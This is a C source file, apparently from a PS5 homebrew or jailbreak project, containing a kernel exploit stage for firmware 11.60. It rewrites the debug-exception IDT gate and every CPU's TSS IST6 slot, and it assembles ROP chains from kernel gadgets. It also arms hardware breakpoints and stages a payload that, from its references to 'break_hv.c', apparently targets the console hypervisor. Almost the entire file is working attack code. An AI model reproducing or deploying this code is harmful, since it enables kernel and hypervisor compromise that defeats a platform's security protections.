/*
 * h1160.c - hardened 11.60 resume hook.
 *
 * The vector 1 (#DB) gate is global: any CPU can take it first. A hook that
 * prepares only one stack/context is therefore unsafe even when the selected
 * thread is pinned (see the 11.60 porting failure ledger: a foreign CPU
 * entering the shared path hangs the console).
 *
 * This module installs one isolated IST6 entry path per CPU:
 *   - CPU 0 (TSS row 0): arm chain, then the production resume handler;
 *   - CPUs 1..15: register-neutral passthrough (pop rsp; iretq).
 * The global gate is published as the final write and is restored as the
 * first handler mutation. Every original IST6 value is saved and restored
 * independently with a readback.
 *
 * Cave geometry and the AP payload parameter/result contract are defined in
 * include/h1160.h and match the validated 11.60 production port.
 */
#include <stdio.h>
#include <stdint.h>
#include <string.h>

#include <ps5/kernel.h>

#include "h1160.h"
#include "khook.h"
#include "kdlsym.h"
#include "elog.h"
#include "util.h"

/* ------------------------------------------------------------------ */
/* small helpers                                                       */
/* ------------------------------------------------------------------ */

static uint64_t h1160_ist_slot(uint64_t tss_base, int cpu, int ist)
{
  return tss_base + (uint64_t)cpu * H1160_TSS_STRIDE + KH_TSS_IST(ist);
}

static void h1160_gate_encode(uint64_t off, uint16_t sel, uint8_t ist,
                              uint64_t *lo, uint64_t *hi)
{
  *lo = (off & 0xffffULL)
      | ((uint64_t)sel << 16)
      | ((uint64_t)(ist & 7) << 32)
      | ((uint64_t)KH_GATE_INTERRUPT << 40)
      | (1ULL << 47)
      | (((off >> 16) & 0xffffULL) << 48);
  *hi = (off >> 32) & 0xffffffffULL;
}

static int h1160_q(uint8_t *seg, size_t *off, size_t cap, uint64_t v)
{
  if (*off + sizeof v > cap)
    return -1;
  memcpy(seg + *off, &v, sizeof v);
  *off += sizeof v;
  return 0;
}

/* POP_RDI; dst-8; POP_RCX; val; mov [rdi+8], rcx; ret */
static int h1160_store(uint8_t *seg, size_t *off, size_t cap,
                       uint64_t dst, uint64_t val)
{
  return h1160_q(seg, off, cap, kgadget(KERNEL_GADGET_POP_RDI)) ||
         h1160_q(seg, off, cap, dst - 8) ||
         h1160_q(seg, off, cap, kgadget(KERNEL_GADGET_POP_RCX)) ||
         h1160_q(seg, off, cap, val) ||
         h1160_q(seg, off, cap, kgadget(KERNEL_GADGET_STORE_RDI8_RCX));
}

/* write + full readback verification in 0x100-byte chunks */
static int h1160_write_verified(uint64_t va, const uint8_t *src, size_t len)
{
  uint8_t verify[0x100];

  if (kwrite(va, src, len) != 0)
    return -1;
  for (size_t at = 0; at < len; at += sizeof verify) {
    size_t n = (len - at < sizeof verify) ? (len - at) : sizeof verify;
    memset(verify, 0, sizeof verify);
    if (kread(va + at, verify, n) != 0)
      return -2;
    if (memcmp(verify, src + at, n) != 0)
      return -3;
  }
  return 0;
}

/* All 16 TSS rows must carry a high-half canonical RSP0, a non-zero IST4
 * handler, and pairwise-distinct RSP0/IST4 pairs.
 *
 * IST6 must be FREE OF REAL OWNERS, but need not be zero. On some 11.60
 * consoles the IST6 slots hold stale per-core data (observed: 0x1, 0x8,
 * 0xffffffff, packed 0xNNNN_xxxxxxxx values, and one direct-map address,
 * while the RSP0/IST4 rows are perfectly regular). A real IST6 handler
 * would sit in the same kernel code region as this core's IST4 handler
 * (per-core exception handler area, ~0x3C00 apart on this firmware). Only
 * such values, and values inside the data cave (a previously armed hook of
 * ours that was not restored), are refused. Every original IST6 value is
 * saved and restored exactly, each with a readback. Returns 0 on success. */
static int h1160_verify_tss(uint64_t tss_base, uint64_t saved_ist[16])
{
  uint64_t rsp0[16], ist4[16];
  uint64_t cave = kdlsym(KERNEL_SYM_DATA_CAVE);

  for (int cpu = 0; cpu < 16; cpu++) {
    uint64_t base = tss_base + (uint64_t)cpu * H1160_TSS_STRIDE;
    rsp0[cpu] = kread64(base + 0x04);
    ist4[cpu] = kread64(base + KH_TSS_IST(4));
    saved_ist[cpu] = kread64(h1160_ist_slot(tss_base, cpu, 6));

    if ((rsp0[cpu] >> 47) != 0x1ffffULL || ist4[cpu] == 0)
      return -1;                    /* bad RSP0 or missing IST4 handler */
    if (saved_ist[cpu]) {
      if (saved_ist[cpu] >= ist4[cpu] - 0x200000ULL &&
          saved_ist[cpu] <  ist4[cpu] + 0x200000ULL)
        return -2;                  /* real kernel handler on IST6 */
      if (cave && saved_ist[cpu] >= cave && saved_ist[cpu] < cave + 0x10000)
        return -2;                  /* stale hook of our own in the cave */
    }
    for (int prior = 0; prior < cpu; prior++) {
      if (rsp0[cpu] == rsp0[prior] || ist4[cpu] == ist4[prior])
        return -3;                  /* rows alias: stride unproven */
    }
  }
  return 0;
}

static int h1160_restore_ists(uint64_t tss_base, const uint64_t saved[16])
{
  int bad = 0;

  for (int cpu = 0; cpu < 16; cpu++) {
    kwrite64(h1160_ist_slot(tss_base, cpu, 6), saved[cpu]);
    if (kread64(h1160_ist_slot(tss_base, cpu, 6)) != saved[cpu])
      bad++;
  }
  return bad ? -1 : 0;
}

/* ------------------------------------------------------------------ */
/* stack builders                                                      */
/* ------------------------------------------------------------------ */

/* Passthrough for non-selected CPUs: the hardware frame is consumed by
 * IRETQ exactly as if the gate were stock. No register is touched. */
static void h1160_build_passthrough(uint8_t *seg, uint64_t seg_va)
{
  size_t off = H1160_TOP;

  memset(seg, 0, H1160_FALL_SIZE);
  memcpy(seg + H1160_IRET_OFF, &(uint64_t){kgadget(KERNEL_GADGET_IRETQ)}, 8);
  (void)h1160_q(seg, &off, H1160_FALL_SIZE, kgadget(KERNEL_GADGET_POP_RSP));
  (void)h1160_q(seg, &off, H1160_FALL_SIZE, seg_va + H1160_IRET_OFF);
}

/* Arm block: the TF single-step entry. Restores DR0/DR7 from the ctx
 * struct, switches IST6[0] to the production handler, and IRETs back to
 * the payload via the 5-qword frame at 0x230. */
static int h1160_build_arm(uint8_t *arm, uint64_t arm_va, uint64_t target,
                           uint64_t selected_ist, uint64_t handler_top)
{
  uint64_t ctx = arm_va + 0x100;
  uint64_t cont = arm_va + 0x200;
  size_t off = H1160_TOP;

  memset(arm, 0, H1160_BLOCK);

  if (h1160_q(arm, &off, H1160_BLOCK, kgadget(KERNEL_GADGET_POP_RAX)) ||
      h1160_q(arm, &off, H1160_BLOCK, target) ||
      h1160_q(arm, &off, H1160_BLOCK, kgadget(KERNEL_GADGET_POP_RDI)) ||
      h1160_q(arm, &off, H1160_BLOCK, ctx) ||
      h1160_q(arm, &off, H1160_BLOCK, kgadget(KERNEL_GADGET_DBREG_RESUME)))
    return -1;
  if (off > 0x100)
    return -1;

  memcpy(arm + 0x100 + KH_RC_RSP, &(uint64_t){cont - 8}, 8);
  memcpy(arm + 0x100 + KH_RC_RIP, &(uint64_t){kgadget(KERNEL_GADGET_RET_TRAMP)}, 8);
  memcpy(arm + 0x100 + KH_RC_DR7, &(uint64_t){KH_DR7_BP0_EXEC}, 8);

  off = 0x200;
  if (h1160_q(arm, &off, H1160_BLOCK, kgadget(KERNEL_GADGET_POP_RDI)) ||
      h1160_q(arm, &off, H1160_BLOCK, selected_ist - 8) ||
      h1160_q(arm, &off, H1160_BLOCK, kgadget(KERNEL_GADGET_POP_RCX)) ||
      h1160_q(arm, &off, H1160_BLOCK, handler_top) ||
      h1160_q(arm, &off, H1160_BLOCK, kgadget(KERNEL_GADGET_STORE_RDI8_RCX)) ||
      h1160_q(arm, &off, H1160_BLOCK, kgadget(KERNEL_GADGET_IRETQ)))
    return -1;
  off += 5 * sizeof(uint64_t);   /* userspace return frame, filled at arm */
  return off <= H1160_BLOCK ? 0 : -1;
}

/* Production resume handler for the selected CPU.
 *
 * Execution order on the #DB hit at the startup_mp call site:
 *   1. RAX = RDI (the wrapper's core argument)
 *   2. [final RDI operand] = RAX      (indirect store; see backpatch)
 *   3. stock gate restored            (first mutation)
 *   4. CHAIN_MARK -> oracle+0x20
 *   5. DR7 = 0                        (breakpoint consumed)
 *   6. AP payload staged to dmap(0x3FFFF000)
 *   7. eight parameter qwords written
 *   8. RDI = core argument, RSI = payload VA, RDX = CR3
 *   9. POP_RSP; IRETQ -> back into the untouched startup_mp wrapper
 */
static int h1160_build_handler(uint8_t *h, uint64_t h_va, uint64_t cave,
                               uint64_t db_gate, uint64_t saved_gate_lo,
                               uint64_t cr3, uint64_t hv_loader_pa)
{
  uint64_t tramp   = h_va + H1160_IRET_OFF;
  uint64_t oracle  = cave + H1160_ORACLE_OFF;
  uint64_t payload = kdldmap(H1160_PAYLOAD_PAGE);
  size_t save_off, rdi_operand_off;
  size_t off = H1160_TOP;

  memset(h, 0, H1160_BLOCK);
  memcpy(h + H1160_IRET_OFF, &(uint64_t){kgadget(KERNEL_GADGET_IRETQ)}, 8);

  if (h1160_q(h, &off, H1160_BLOCK, kgadget(KERNEL_GADGET_MOV_RAX_RDI)) ||
      h1160_q(h, &off, H1160_BLOCK, kgadget(KERNEL_GADGET_POP_RCX)))
    return -1;
  save_off = off;
  if (h1160_q(h, &off, H1160_BLOCK, 0) ||
      h1160_q(h, &off, H1160_BLOCK, kgadget(KERNEL_GADGET_ST_RCX_RAX)) ||
      h1160_store(h, &off, H1160_BLOCK, db_gate, saved_gate_lo) ||
      h1160_store(h, &off, H1160_BLOCK, oracle + 0x20, H1160_CHAIN_MARK) ||
      h1160_q(h, &off, H1160_BLOCK, kgadget(KERNEL_GADGET_POP_RAX)) ||
      h1160_q(h, &off, H1160_BLOCK, 0) ||
      h1160_q(h, &off, H1160_BLOCK, kgadget(KERNEL_GADGET_SET_DR7)) ||
      h1160_q(h, &off, H1160_BLOCK, kgadget(KERNEL_GADGET_CLD)) ||
      h1160_q(h, &off, H1160_BLOCK, kgadget(KERNEL_GADGET_POP_RDI)) ||
      h1160_q(h, &off, H1160_BLOCK, payload) ||
      h1160_q(h, &off, H1160_BLOCK, kgadget(KERNEL_GADGET_POP_RSI)) ||
      h1160_q(h, &off, H1160_BLOCK, cave + H1160_STAGE_OFF) ||
      h1160_q(h, &off, H1160_BLOCK, kgadget(KERNEL_GADGET_POP_RCX)) ||
      h1160_q(h, &off, H1160_BLOCK, H1160_STAGE_SIZE) ||
      h1160_q(h, &off, H1160_BLOCK, kgadget(KERNEL_GADGET_REP_MOVSB)))
    return -1;

  /* AP payload parameter block (contract with break_hv.c, 11.60 mode). */
#define H1160_PARAM(offst, value) \
  if (h1160_store(h, &off, H1160_BLOCK, \
                  kdldmap(H1160_PAYLOAD_PAGE + (offst)), (value))) \
    return -1
  H1160_PARAM(0xF00, kdlsym(KERNEL_SYM_MP_STARTUP_INIT_VECTOR));
  H1160_PARAM(0xF08, kdldmap(0));
  H1160_PARAM(0xF10, oracle);
  H1160_PARAM(0xF18, hv_loader_pa);
  H1160_PARAM(0xF20, cave + H1160_STASH_OFF);
  H1160_PARAM(0xF28, payload);
  H1160_PARAM(0xF30, cr3);
  H1160_PARAM(0xF38, H1160_AP_MODE);
#undef H1160_PARAM

  if (h1160_q(h, &off, H1160_BLOCK, kgadget(KERNEL_GADGET_POP_RDI)))
    return -1;
  rdi_operand_off = off;
  if (h1160_q(h, &off, H1160_BLOCK, 0) ||
      h1160_q(h, &off, H1160_BLOCK, kgadget(KERNEL_GADGET_POP_RSI)) ||
      h1160_q(h, &off, H1160_BLOCK, payload) ||
      h1160_q(h, &off, H1160_BLOCK, kgadget(KERNEL_GADGET_POP_RDX)) ||
      h1160_q(h, &off, H1160_BLOCK, cr3) ||
      h1160_q(h, &off, H1160_BLOCK, kgadget(KERNEL_GADGET_POP_RSP)) ||
      h1160_q(h, &off, H1160_BLOCK, tramp))
    return -1;

  /* Backpatch: the first POP_RCX operand becomes the address of the final
   * POP_RDI operand, so the early ST_RCX_RAX stores the core argument
   * directly where the late POP_RDI will pick it up. */
  memcpy(h + save_off, &(uint64_t){h_va + rdi_operand_off}, 8);

  elog("[h1160] handler chain = 0x%lx bytes\n", (unsigned long)(off - H1160_TOP));
  return off <= H1160_BLOCK ? 0 : -1;
}

/* ------------------------------------------------------------------ */
/* arm / cleanup                                                       */
/* ------------------------------------------------------------------ */

/* Publish the global gate last, then take one TF single-step so the arm
 * chain executes immediately in a known-safe context. */
__attribute__((noinline))
static void h1160_publish_and_single_step(uint64_t db_gate, uint64_t gate_lo,
                                          uint64_t arm_va,
                                          uint64_t return_frame)
{
  uint64_t rsp, rbx, rbp, r12, r13, r14, r15;
  void *resumed = &&resumed_label;

  __asm__ volatile("mov %%rsp,%0" : "=r"(rsp));
  __asm__ volatile("mov %%rbx,%0" : "=r"(rbx));
  __asm__ volatile("mov %%rbp,%0" : "=r"(rbp));
  __asm__ volatile("mov %%r12,%0" : "=r"(r12));
  __asm__ volatile("mov %%r13,%0" : "=r"(r13));
  __asm__ volatile("mov %%r14,%0" : "=r"(r14));
  __asm__ volatile("mov %%r15,%0" : "=r"(r15));

  uint64_t ctx = arm_va + 0x100;
  kwrite64(ctx + 0x00, r15);
  kwrite64(ctx + 0x08, r14);
  kwrite64(ctx + 0x10, r13);
  kwrite64(ctx + 0x18, r12);
  kwrite64(ctx + KH_RC_RBP, rbp);
  kwrite64(ctx + KH_RC_RSP, return_frame - 7 * sizeof(uint64_t));
  kwrite64(ctx + 0x30, rbx);

  kwrite64(return_frame + 0x00, (uint64_t)resumed);
  kwrite64(return_frame + 0x08, KH_USER_CS);
  kwrite64(return_frame + 0x10, KH_RFLAGS_USER);
  kwrite64(return_frame + 0x18, rsp);
  kwrite64(return_frame + 0x20, KH_USER_SS);

  /* The global gate goes up only now that every per-core path is in place. */
  kwrite64(db_gate, gate_lo);
  __asm__ volatile(
      "pushfq             \n\t"
      "orq $0x100, (%%rsp)\n\t"
      "popfq              \n\t"
      "nop                \n\t"
      ::: "memory", "cc");
resumed_label:
  ;
}

int h1160_is_armed(uint64_t cave)
{
  return kread64(cave + H1160_SAVE_OFF) == H1160_STATE_ARMED;
}

int h1160_arm(uint64_t cave, uint64_t cr3, uint64_t hv_loader_pa,
              const uint8_t *payload, size_t payload_len)
{
  uint64_t tss_base = kdlsym(KERNEL_SYM_COMMON_TSS);
  uint64_t idt_base = kdlsym(KERNEL_SYM_IDT_ARRAY);
  uint64_t db_gate  = idt_base + 16 * KH_VEC_DB;
  uint64_t arm_va   = cave + H1160_ARM_OFF;
  uint64_t hdl_va   = cave + H1160_HANDLER_OFF;
  uint64_t stage_va = cave + H1160_STAGE_OFF;
  uint64_t save     = cave + H1160_SAVE_OFF;
  uint64_t target   = kdlsym(KERNEL_SYM_HV_MP_STARTUP_CALL);
  uint64_t saved_gate_lo, saved_gate_hi, gate_lo, gate_hi;
  uint64_t saved_ist[16];
  uint8_t arm[H1160_BLOCK], handler[H1160_BLOCK],
          fallback[H1160_FALL_SIZE], staged[H1160_STAGE_SIZE];
  int bad = 0;

  if ((kernel_get_fw_version() & 0xffff0000U) != 0x11600000U)
    return -1;
  if (!payload || payload_len == 0 || payload_len > sizeof staged)
    return -1;
  if (h1160_is_armed(cave))
    return -1;

  /* --- read and validate every original value that will change --- */
  saved_gate_lo = kread64(db_gate);
  saved_gate_hi = kread64(db_gate + 8);
  elog("[h1160] saved gate lo=%016lx hi=%016lx\n",
         (unsigned long)saved_gate_lo, (unsigned long)saved_gate_hi);
  if (!((saved_gate_lo >> 47) & 1) ||
      ((saved_gate_lo >> 32) & 7) != 4)
    return -2;                       /* stock #DB gate: present, IST 4 */
  {
    int vtss = h1160_verify_tss(tss_base, saved_ist);
    if (vtss) {
      /* Read-only diagnostics (parity with the validated PR #7
       * verify_tss_layout REFUSE lines): dump every TSS row so the
       * failing sub-check is visible in the run log.
       * vtss: -1 = bad RSP0 / missing IST4, -2 = IST6 busy,
       *       -3 = RSP0/IST4 row alias (stride unproven). */
      for (int cpu = 0; cpu < 16; cpu += 2) {
        uint64_t b0 = tss_base + (uint64_t)cpu * H1160_TSS_STRIDE;
        uint64_t b1 = tss_base + (uint64_t)(cpu + 1) * H1160_TSS_STRIDE;
        elog("[h1160] TSS cpu%2d rsp0=%016lx ist4=%016lx ist6=%016lx | "
             "cpu%2d rsp0=%016lx ist4=%016lx ist6=%016lx\n",
               cpu,
               (unsigned long)kread64(b0 + 0x04),
               (unsigned long)kread64(b0 + KH_TSS_IST(4)),
               (unsigned long)saved_ist[cpu],
               cpu + 1,
               (unsigned long)kread64(b1 + 0x04),
               (unsigned long)kread64(b1 + KH_TSS_IST(4)),
               (unsigned long)saved_ist[cpu + 1]);
      }
      elog("[h1160] verify_tss REFUSE: %d (-1=bad RSP0/IST4, -2=IST6 owned, "
           "-3=row alias)\n", vtss);
      return -3;
    }
  }

  for (int cpu = 0; cpu < 16; cpu += 4)
    elog("[h1160] IST6 %d..%d = %016lx %016lx %016lx %016lx\n", cpu, cpu + 3,
           (unsigned long)saved_ist[cpu], (unsigned long)saved_ist[cpu + 1],
           (unsigned long)saved_ist[cpu + 2], (unsigned long)saved_ist[cpu + 3]);

  h1160_gate_encode(kgadget(KERNEL_GADGET_PIVOT_ADD_RSP28_RET),
                    (uint16_t)(saved_gate_lo >> 16), 6, &gate_lo, &gate_hi);
  if (gate_hi != saved_gate_hi)
    return -4;

  /* --- stage the AP payload, fully verified --- */
  memset(staged, 0, sizeof staged);
  memcpy(staged, payload, payload_len);
  if (h1160_write_verified(stage_va, staged, sizeof staged) != 0)
    return -5;

  /* --- build and publish private state before the global gate --- */
  if (h1160_build_arm(arm, arm_va, target,
                      h1160_ist_slot(tss_base, 0, 6),
                      hdl_va + H1160_TOP) != 0)
    return -6;
  if (h1160_build_handler(handler, hdl_va, cave, db_gate,
                          saved_gate_lo, cr3, hv_loader_pa) != 0)
    return -6;
  if (h1160_write_verified(arm_va, arm, sizeof arm) != 0)
    return -7;
  if (h1160_write_verified(hdl_va, handler, sizeof handler) != 0)
    return -7;

  for (int cpu = 1; cpu < 16; cpu++) {
    uint64_t va = cave + H1160_FALL_OFF + (uint64_t)(cpu - 1) * H1160_FALL_SIZE;
    h1160_build_passthrough(fallback, va);
    if (h1160_write_verified(va, fallback, sizeof fallback) != 0)
      return -8;
  }

  kwrite64(save + 0x00, H1160_STATE_ARMED);
  kwrite64(save + 0x08, saved_gate_lo);
  kwrite64(save + 0x10, saved_gate_hi);
  for (int cpu = 0; cpu < 16; cpu++)
    kwrite64(save + 0x18 + (uint64_t)cpu * 8, saved_ist[cpu]);
  if (kread64(save + 0x00) != H1160_STATE_ARMED)
    return -9;

  /* --- per-core IST6 slots: selected path first, then the fallbacks --- */
  kwrite64(h1160_ist_slot(tss_base, 0, 6), arm_va + H1160_TOP);
  for (int cpu = 1; cpu < 16; cpu++)
    kwrite64(h1160_ist_slot(tss_base, cpu, 6),
             cave + H1160_FALL_OFF
             + (uint64_t)(cpu - 1) * H1160_FALL_SIZE + H1160_TOP);

  for (int cpu = 0; cpu < 16; cpu++) {
    uint64_t want = (cpu == 0)
        ? arm_va + H1160_TOP
        : cave + H1160_FALL_OFF
          + (uint64_t)(cpu - 1) * H1160_FALL_SIZE + H1160_TOP;
    if (kread64(h1160_ist_slot(tss_base, cpu, 6)) != want)
      bad++;
  }
  if (bad) {
    h1160_restore_ists(tss_base, saved_ist);
    kwrite64(save + 0x00, 0);
    return -10;
  }

  elog("[h1160] 16 isolated IST6 paths verified; gate last\n");
  h1160_publish_and_single_step(db_gate, gate_lo, arm_va,
                                arm_va + 0x200 + 6 * sizeof(uint64_t));
  return 0;
}

int h1160_cleanup(uint64_t cave)
{
  uint64_t tss_base = kdlsym(KERNEL_SYM_COMMON_TSS);
  uint64_t idt_base = kdlsym(KERNEL_SYM_IDT_ARRAY);
  uint64_t db_gate  = idt_base + 16 * KH_VEC_DB;
  uint64_t save     = cave + H1160_SAVE_OFF;
  uint64_t saved_gate_lo, saved_gate_hi;
  uint64_t saved_ist[16];

  if (!h1160_is_armed(cave))
    return -1;

  saved_gate_lo = kread64(save + 0x08);
  saved_gate_hi = kread64(save + 0x10);
  for (int cpu = 0; cpu < 16; cpu++)
    saved_ist[cpu] = kread64(save + 0x18 + (uint64_t)cpu * 8);

  /* Global gate down first, then every IST slot, all with readback. */
  kwrite64(db_gate + 8, saved_gate_hi);
  kwrite64(db_gate, saved_gate_lo);
  int bad = h1160_restore_ists(tss_base, saved_ist);
  if (kread64(db_gate) != saved_gate_lo ||
      kread64(db_gate + 8) != saved_gate_hi || bad)
    return -2;

  elog("[h1160] cleanup: gate + 16 IST6 restored (saved gate lo=%016lx)\n",
         (unsigned long)saved_gate_lo);
  kwrite64(save + 0x00, 0);
  return kread64(save + 0x00) == 0 ? 0 : -3;
}

/* ------------------------------------------------------------------ */
/* post-resume result helpers                                          */
/* ------------------------------------------------------------------ */

int h1160_result_done(uint64_t cave)
{
  uint64_t oracle = cave + H1160_ORACLE_OFF;
  return kread64(oracle + 0x00) == H1160_MARK_ENTERED &&
         kread64(oracle + 0x08) == H1160_MODE_STRIKE &&
         kread64(oracle + 0x18) == H1160_MARK_DONE;
}

/* The non-negotiable success shape. */
int h1160_result_success(uint64_t cave)
{
  uint64_t stash = cave + H1160_STASH_OFF;
  return kread64(cave + H1160_PREP_OFF) == H1160_PREP_MARK &&
         h1160_result_done(cave) &&
         kread64(stash + 0x00) == 0 &&   /* error */
         kread64(stash + 0x10) == 1 &&   /* self_count */
         kread64(stash + 0x18) == 16 &&  /* targets  */
         kread64(stash + 0x40) == 16 &&  /* written  */
         kread64(stash + 0x48) == 16;    /* verified */
}

void h1160_result_print(uint64_t cave)
{
  uint64_t oracle = cave + H1160_ORACLE_OFF;
  uint64_t stash  = cave + H1160_STASH_OFF;

  elog("[11.60] chain=%016lx entered=%016lx mode=%016lx done=%016lx\n",
         kread64(oracle + 0x20), kread64(oracle + 0x00),
         kread64(oracle + 0x08), kread64(oracle + 0x18));
  elog("[11.60] error=%lu self=%016lx self_count=%lu targets=%lu\n",
         (unsigned long)kread64(stash + 0x00), kread64(stash + 0x08),
         (unsigned long)kread64(stash + 0x10),
         (unsigned long)kread64(stash + 0x18));
  elog("[11.60] self_ncr3=%016lx asid=%lu iopm=%016lx\n",
         kread64(stash + 0x20), (unsigned long)kread64(stash + 0x28),
         kread64(stash + 0x30));
  elog("[11.60] written=%lu verified=%lu\n",
         (unsigned long)kread64(stash + 0x40),
         (unsigned long)kread64(stash + 0x48));
}

/* Pre-arm forensics: dump any state left by a previous (possibly crashed)
 * run. After a full reboot the cave is a fresh kernel allocation and every
 * value below reads stock; after a soft recovery reboot the residue tells
 * us exactly how far the previous chain got. Read-only. */
void h1160_forensics(uint64_t cave)
{
  uint64_t tss_base = kdlsym(KERNEL_SYM_COMMON_TSS);
  uint64_t idt_base = kdlsym(KERNEL_SYM_IDT_ARRAY);
  uint64_t db_gate  = idt_base + 16 * KH_VEC_DB;
  uint64_t oracle   = cave + H1160_ORACLE_OFF;
  uint64_t stash    = cave + H1160_STASH_OFF;
  uint64_t g0       = kread64(db_gate);

  elog("[h1160] forensics: gate lo=%016lx hi=%016lx ist=%lu\n",
         (unsigned long)g0, (unsigned long)kread64(db_gate + 8),
         (unsigned long)((g0 >> 32) & 7));
  for (int cpu = 0; cpu < 16; cpu += 4)
    elog("[h1160] forensics: IST6 %2d..%2d = %016lx %016lx %016lx %016lx\n",
           cpu, cpu + 3,
           (unsigned long)kread64(h1160_ist_slot(tss_base, cpu, 6)),
           (unsigned long)kread64(h1160_ist_slot(tss_base, cpu + 1, 6)),
           (unsigned long)kread64(h1160_ist_slot(tss_base, cpu + 2, 6)),
           (unsigned long)kread64(h1160_ist_slot(tss_base, cpu + 3, 6)));
  elog("[h1160] forensics: state=%016lx prep=%016lx\n",
         (unsigned long)kread64(cave + H1160_SAVE_OFF),
         (unsigned long)kread64(cave + H1160_PREP_OFF));
  elog("[h1160] forensics: oracle chain=%016lx entered=%016lx mode=%016lx "
       "done=%016lx\n",
         (unsigned long)kread64(oracle + 0x20),
         (unsigned long)kread64(oracle + 0x00),
         (unsigned long)kread64(oracle + 0x08),
         (unsigned long)kread64(oracle + 0x18));
  elog("[h1160] forensics: stash error=%016lx self=%016lx self_count=%lu "
       "targets=%lu\n",
         (unsigned long)kread64(stash + 0x00),
         (unsigned long)kread64(stash + 0x08),
         (unsigned long)kread64(stash + 0x10),
         (unsigned long)kread64(stash + 0x18));
  elog("[h1160] forensics: stash iopm=%016lx written=%lu verified=%lu\n",
         (unsigned long)kread64(stash + 0x30),
         (unsigned long)kread64(stash + 0x40),
         (unsigned long)kread64(stash + 0x48));
}
